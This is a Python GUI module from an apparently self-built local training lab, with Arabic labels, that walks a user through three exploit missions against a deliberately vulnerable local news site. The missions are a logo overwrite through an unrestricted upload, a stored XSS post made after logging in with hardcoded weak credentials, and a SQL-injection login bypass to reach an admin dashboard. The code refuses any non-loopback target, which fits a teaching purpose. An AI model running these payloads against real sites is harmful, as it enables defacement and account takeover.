"""
local-lab/gui/missions.py — مهمات عملية (PoC): إثبات السيطرة على الموقع بعينيك.
================================================================================
الفكرة التي طلبتها: لا نكتفي بإظهار «توجد ثغرة»، بل نُثبت أننا نتحكم فعليًا:
  المهمة 1: تغيير شعار الموقع (استبدال ملف حي عبر ثغرة رفع الملفات).
  المهمة 2: تحكم في محتوى الموقع (اعتمادات ضعيفة → دخول → نشر كود مخزّن XSS).

كل طلب يمر عبر Scope (loopback / مرخّص بوضع توكيد «أؤكد») من الواجهة الأم.
"""
import re
import sys
import tkinter as tk
import webbrowser
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scanner"))
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "target"))

from session import Session

try:
    import png_util
except Exception:  # الموقع لم يُبنَ بعد نظريًا
    png_util = None

DEFAULT_TARGET = "http://127.0.0.1:5001/"
MARK = "<script>alert(\"LocalLab-PoC\")</script>"

MISSIONS = {
    "LOGO": {
        "title": "👑 مهمة 1: غيّر شعار موقع الأخبار بنفسك",
        "sub": "الثغرة: رفع ملفات بلا فحص الامتداد → استبدال ملف حي يخدمه الموقع آنيًا.",
        "steps": [
            ("شاهد الموقع وشعاره الأصلي بعينيك", "_m1_open"),
            ("أنشئ شعارًا بديلًا مميزًا (يتولد لك هنا)", "_m1_gen"),
            ("ارفع الشعار البديل عبر ثغرة الرفع (بالاسم logo_current.png)", "_m1_upload"),
            ("تحقق: الشعار الذي يصل الزائر أصبح شعارك — ثم افتح الموقع", "_m1_verify"),
            ("أعد الشعار الأصلي (نظّف الموقع بعد إثبات السيطرة)", "_m1_reset"),
        ],
    },
    "XSS": {
        "title": "🎯 مهمة 2: تحكّم بالمحتوى بمقال مسموم",
        "sub": "الثغرة: اعتماد ضعيف معروف → دخول → نشر محتوى تخزن فيه XSS تعمل عند كل زائر.",
        "steps": [
            ("شاهد صفحة الدخول وافهم الاعتماد الضعيف المعروف", "_m2_open"),
            ("سجّل الدخول بحساب معروف ضعيف (omari / user123)", "_m2_login"),
            ("انشر مقالًا يحمل كودًا مخزّنًا (Stored XSS)", "_m2_post"),
            ("تحقق أن الكود حيّ ويُخدم لكل زائر — وافتحه بعينيك", "_m2_verify"),
        ],
    },
    "DASH": {
        "title": "👑 مهمة 3: اقتحم لوحة التحكم وشاهدها",
        "sub": "الثغرة: حقن SQL في الدخول → جلسة مدير → لوحة التحكم (أقوى ما في الموقع) تُعرَض لك داخل البرنامج.",
        "steps": [
            ("تجاوز الدخول بحقنة التفافية — تصبح المدير بجلسة حقيقية", "_m3_bypass"),
            ("افتح لوحة التحكم داخل البرنامج وشاهد صلاحياتك بعينيك", "_m3_open"),
            ("غيّر نبذتك كمدير — أثر مرئي للسيطرة", "_m3_change"),
            ("تحقق من الأثر ثم نظّف (أعد نبذة محايدة)", "_m3_reset"),
        ],
    },
}


class MissionsWindow:
    def __init__(self, app):
        self.app = app
        self.top = tk.Toplevel(app.root)
        self.top.title("🎯 مهمات عملية — إثبات السيطرة (PoC)")
        self.top.geometry("920x670")
        self.top.configure(bg="#0b1220")
        self.session = None
        self.state = {}
        self.rows = []

        selector = tk.Frame(self.top, bg="#0b1220")
        selector.pack(fill="x", padx=16, pady=(14, 6))
        for key in MISSIONS:
            m = MISSIONS[key]
            b = app._mk_button(selector, m["title"], lambda k=key: self._select(k),
                               bg="#7c3aed", hover="#8b5cf6")
            b.pack(side="left", padx=(0, 8))

        self.mission_body = tk.Frame(self.top, bg="#0b1220")
        self.mission_body.pack(fill="both", expand=True, padx=16, pady=(8, 0))

        self.mission_console = self._build_console()
        self._select("LOGO")

    def _build_console(self):
        wrap = tk.Frame(self.top, bg="#0b1220")
        wrap.pack(fill="x", padx=16, pady=(6, 12))
        tk.Label(wrap, text="سجل المهمة — ما نفّذناه لحظةً بلحظة",
                 bg="#0b1220", fg="#34d399", font=("Segoe UI", 10, "bold"),
                 justify="right").pack(anchor="w")
        box = tk.Frame(wrap, bg="#000000", highlightbackground="#1f2937",
                       highlightthickness=1, bd=0)
        box.pack(fill="x", pady=(4, 0))
        t = tk.Text(box, height=7, bg="#02060d", fg="#e2e8f0",
                    font=("Consolas", 9), wrap="word", borderwidth=0,
                    padx=10, pady=6)
        t.pack(fill="x")
        for n, fg in (("op", "#e2e8f0"), ("ok", "#34d399"),
                      ("warn", "#fbbf24"), ("err", "#f87171"),
                      ("info", "#7dd3fc"), ("cur", "#f472b6")):
            t.tag_configure(n, foreground=fg)
        return t

    # ------------------------------------------------ خدمة مشتركة
    def _log(self, msg, tag="op"):
        ts = datetime.now().strftime("%H:%M:%S")
        try:
            self.mission_console.insert("end", f"  [{ts}]  {msg}\n", (tag,))
            self.mission_console.see("end")
        except Exception:
            pass
        self.app._console(f"[مهمة] {msg}", tag)

    def _base(self):
        target = self.app.target_var.get().strip() or DEFAULT_TARGET
        return target.rstrip("/")

    def _sess(self):
        # المهام تكتب على الهدف (رفع ملف، زرع XSS، تغيير شعار) — تشويه أي
        # موقع خارجي جريمة حتى بتوكيد «أؤكد». لذلك: المختبر المحلي فقط، بلا استثناء.
        from scoped import is_loopback, normalize_host
        base = self._base()
        host = normalize_host(base.split("://", 1)[1]) if "://" in base else normalize_host(base)
        if not is_loopback(host):
            raise PermissionError(
                "مهام الإثبات (PoC) تعمل على المختبر المحلي فقط — "
                "كتابة XSS/شعارات على موقع خارجي تشويه، لا فحص مصرّح."
            )
        if self.session is None:
            self.session = Session(self.app._make_scope())
        return self.session

    def _text(self, status, headers, body):
        try:
            return body.decode("utf-8", "replace")
        except Exception:
            return ""

    # ------------------------------------------------ اختيار المهمة
    def _select(self, key):
        self.session = None
        self.state = {}
        for w in self.mission_body.winfo_children():
            w.destroy()
        m = MISSIONS[key]
        self.state["key"] = key
        tk.Label(self.mission_body, text=m["title"], bg="#0b1220",
                 fg="#e0f2fe", font=("Segoe UI", 13, "bold"),
                 justify="right", anchor="w").pack(anchor="w")
        tk.Label(self.mission_body, text=m["sub"], bg="#0b1220",
                 fg="#7dd3fc", font=("Segoe UI", 10), justify="right",
                 anchor="w", wraplength=860).pack(anchor="w", pady=(2, 8))
        self.rows = []
        for i, (label, handler) in enumerate(m["steps"]):
            row = tk.Frame(self.mission_body, bg="#111c30",
                           highlightbackground="#1e3a5f", highlightthickness=1)
            row.pack(fill="x", pady=(0, 8))
            ok = tk.Label(row, text="○", bg="#111c30", fg="#475569",
                          font=("Segoe UI", 12, "bold"), width=3)
            ok.pack(side="right", padx=(0, 8))
            tk.Label(row, text=f"{i + 1}. {label}", bg="#111c30", fg="#e2e8f0",
                     font=("Segoe UI", 10), justify="right", anchor="w",
                     wraplength=640).pack(side="right", padx=8)
            b = self.app._mk_button(row, "نفّذ", getattr(self, handler),
                                    bg="#0284c7", hover="#0ea5e9")
            b.pack(side="left", padx=6, pady=4)
            self.rows.append({"row": row, "ok": ok, "btn": b, "done": False})
        self._log("جرّب المهمة بالترتيب: كل زر «نفّذ» = خطوة حقيقية على الموقع.", "info")

    def _done(self, ok_widget, msg):
        state = self.state.setdefault(self.state["key"], "")
        if isinstance(ok_widget, tk.Label):
            ok_widget.config(text="✓", fg="#34d399")
        self._log(msg, "ok")

    def _fail(self, msg):
        self._log(msg, "err")

    # ================================================== المهمة 1: الشعار
    def _m1_open(self):
        base = self._base()
        webbrowser.open(base + "/")
        self._log(f"فُتح الموقع: {base + '/'} — انظر للشعار في رأس الصفحة.", "ok")

    def _m1_gen(self):
        if png_util is None:
            self._fail("مولد الشعارات غير متاح — أعد بناء الموقع الهدف أولًا.")
            return
        self.state["new_logo"] = png_util.replacement_logo()
        self.state["orig_logo"] = png_util.default_logo()
        self._log("وُلد شعار بديل (أحمر/برتقالي) — جاهز للاستبدال بالشعار الحالي.", "ok")

    def _m1_upload(self):
        if not self.state.get("new_logo"):
            self._fail("أنشئ الشعار البديل أولًا (زر الخطوة 2).")
            return
        s = self._sess()
        status, _h, body = s.post(self._base() + "/upload",
                                  files={"file": ("logo_current.png",
                                                  self.state["new_logo"])})
        txt = self._text(status, _h, body)
        if "تم الرفع" in txt:
            self._log("رُفع الشعار البديل بالاسم نفسه (logo_current.png) → استبدل الملف الحي ✓", "ok")
        else:
            self._fail(f"الرفع لم يُؤكد (HTTP {status}) — راجع سجل المهمة.")

    def _m1_verify(self):
        if not self.state.get("new_logo"):
            self._fail("أنشئ الشعار وارفعه أولًا.")
            return
        s = self._sess()
        status, _h, body = s.get(self._base() + "/logo")
        replaced = body == self.state["new_logo"]
        if replaced:
            self._log("مؤكد ✓ — بايتات الشعار الذي يخدمه الموقع الآن = شعارك البديل حرفيًا.", "ok")
            self._show_logos(self.state.get("orig_logo"), self.state["new_logo"])
            webbrowser.open(self._base() + "/")
            self._log("فُتح الموقع: إن لم تتغير الصورة بالمتصفح اضغط Ctrl+F5 (تخزين مؤقت).", "info")
        else:
            self._fail("الشعار لم يتغير بعد — نفّذ خطوات الإنشاء ثم الرفع أولًا.")

    def _show_logos(self, before, after):
        """قبل/بعد بالصور داخل البرنامج — الدليل في وجهك."""
        try:
            from viewer import photo_from_bytes
        except Exception as e:
            self._log(f"عارض الصور غير متاح: {e}", "warn")
            return
        top = tk.Toplevel(self.app.root)
        top.title("🖼 قبل / بعد — شعار الموقع")
        top.configure(bg="#0b1220")
        box = tk.Frame(top, bg="#0b1220")
        box.pack(padx=16, pady=14)
        self._logo_photos = []
        for title, data in (("قبل (الأصلي)", before), ("بعد (شعارك)", after)):
            f = tk.Frame(box, bg="#111c30")
            f.pack(side="left", padx=10)
            tk.Label(f, text=title, bg="#111c30", fg="#e2e8f0",
                     font=("Segoe UI", 11, "bold")).pack(pady=6)
            ph = photo_from_bytes(data) if data else None
            if ph is None:
                tk.Label(f, text="(تعذّر عرض الصورة)", bg="#111c30",
                         fg="#f87171").pack(padx=20, pady=20)
                continue
            self._logo_photos.append(ph)
            tk.Label(f, image=ph, bg="#ffffff", padx=12, pady=12).pack(
                padx=12, pady=(0, 12))
        self._log("عُرض الشعاران جنبًا إلى جنب داخل البرنامج — قارن بعينيك.", "ok")

    def _m1_reset(self):
        if not self.state.get("orig_logo"):
            self._fail("أنشئ الشعار البديل أولًا (يُخزّن الأصل تلقائيًا).")
            return
        s = self._sess()
        s.post(self._base() + "/upload",
               files={"file": ("logo_current.png", self.state["orig_logo"])})
        status, _h, body = s.get(self._base() + "/logo")
        if body == self.state["orig_logo"]:
            self._log("عاد الشعار الأصلي ✓ — نظّفت أثر السيطرة على الموقع.", "ok")
        else:
            self._fail("الاستعادة لم تُؤكد — جرّب التنظيف يدويًا عبر /upload.")

    # ================================================== المهمة 2: XSS مخزنة
    def _m2_open(self):
        base = self._base()
        webbrowser.open(base + "/login")
        self._log("فُتحت صفحة الدخول — اعتماد معروف ضعيف: omari / user123 (موجود بالموقع).", "ok")

    def _m2_login(self):
        s = self._sess()
        base = self._base()
        status, _h, body = s.post(base + "/login",
                                  fields={"username": "omari",
                                          "password": "user123"})
        nb = body if status != 302 else b""
        self._log(f"أُرسلت بيانات الدخول (HTTP {status}) — جلسة مسجلة: {len(s.cookies())} كعكة.",
                  "ok" if status in (200, 302) and "خاطئة" not in nb.decode("utf-8", "replace") else "err")
        if status == 200 and "خاطئة" in nb.decode("utf-8", "replace"):
            self._fail("الدخول لم ينجح — البيانات المعروفة تغيّرت في الموقع.")

    def _m2_post(self):
        s = self._sess()
        base = self._base()
        title = "تجربة تعلم محلية (ملحق PoC)"
        content = f'<b style="color:#f87171">لوحة صغيرة من المختبر</b> · {MARK}'
        status, _h, body = s.post(
            base + "/blog/new",
            fields={"title": title, "content": content})
        if status not in (200, 302):
            self._fail(f"النشر رُفض (HTTP {status}) — سجّل الدخول أولًا؟")
            return
        sget, _h2, b2 = s.get(base + "/blog")
        ids = re.findall(r'href="/blog/(\d+)"', self._text(sget, _h2, b2))
        if not ids:
            self._fail("تعذّر إيجاد المقال الجديد في قائمة المدونة.")
            return
        self.state["pid"] = max(int(x) for x in ids)
        self.state["article"] = content
        self._log(f"نُشر المقال #{self.state['pid']} — الكود حُفظ في قاعدة بيانات الموقع ✓", "ok")

    def _m2_verify(self):
        if not self.state.get("pid"):
            self._fail("انشر المقال أولًا (الخطوة 3).")
            return
        s = self._sess()
        status, _h, body = s.get(self._base() + f"/blog/{self.state['pid']}")
        txt = self._text(status, _h, body)
        alive = "<script" in txt and "LocalLab-PoC" in txt
        if alive:
            self._log("مؤكد ✓ — الكود يُخدَّم لفظيًا لكل زائر للمقال: افتحه وانظر رسالة التنبيه تعمل.", "ok")
            webbrowser.open(self._base() + f"/blog/{self.state['pid']}")
        else:
            self._fail("الكود غير ظاهر في بُنية المقال — أعد النشر (الخطوة 3).")

    # ================================================== المهمة 3: لوحة التحكم
    def _m3_bypass(self):
        s = self._sess()
        base = self._base()
        status, _h, body = s.post(base + "/login",
                                  fields={"username": "' OR '1'='1' --",
                                          "password": "x"})
        st2, _h2, b2 = s.get(base + "/dashboard")
        txt = self._text(st2, _h2, b2)
        if st2 == 200 and "لوحة التحكم" in txt:
            who = "المدير" if "admin" in txt.lower() else "مستخدم"
            self.state["dash"] = True
            self._log(f"تجاوز ناجح ✓ — أنت الآن {who} بجلسة حقيقية "
                      f"({len(s.cookies())} كعكة). لوحة التحكم مفتوحة لك.", "ok")
        else:
            self._fail(f"التجاوز لم يفتح اللوحة (HTTP {st2}) — الموقع قد يكون مُصلَّحًا.")

    def _m3_open(self):
        if not self.state.get("dash"):
            self._fail("نفّذ التجاوز أولًا (الخطوة 1).")
            return
        try:
            from viewer import PageViewer
        except Exception as e:
            self._fail(f"العارض غير متاح: {e}")
            return
        v = PageViewer(self.app, self._sess(), self._base())
        v.open(self._base() + "/dashboard")
        self._log("فُتحت لوحة التحكم داخل البرنامج — انظر اسمك وصلاحياتك (تحديث ملف/مقال جديد).", "ok")

    def _m3_change(self):
        if not self.state.get("dash"):
            self._fail("نفّذ التجاوز أولًا (الخطوة 1).")
            return
        s = self._sess()
        mark = "DASH-PWN-مسيطر"
        status, _h, body = s.post(self._base() + "/settings",
                                  fields={"bio": mark})
        st2, _h2, b2 = s.get(self._base() + "/profile/1")
        if mark in self._text(st2, _h2, b2):
            self.state["mark"] = mark
            self._log("تغيّرت نبذة المدير إلى نبذتك ✓ — هذا هو الأثر المرئي للسيطرة.", "ok")
        else:
            self._fail(f"التغيير لم يظهر (HTTP {st2}) — راجع الجلسة.")

    def _m3_reset(self):
        if not self.state.get("mark"):
            self._fail("نفّذ التغيير أولًا (الخطوة 3).")
            return
        s = self._sess()
        s.post(self._base() + "/settings", fields={"bio": "مدير الموقع"})
        self._log("نُظّفت النبذة ✓ — أعدت الموقع لحالته بعد إثبات السيطرة.", "ok")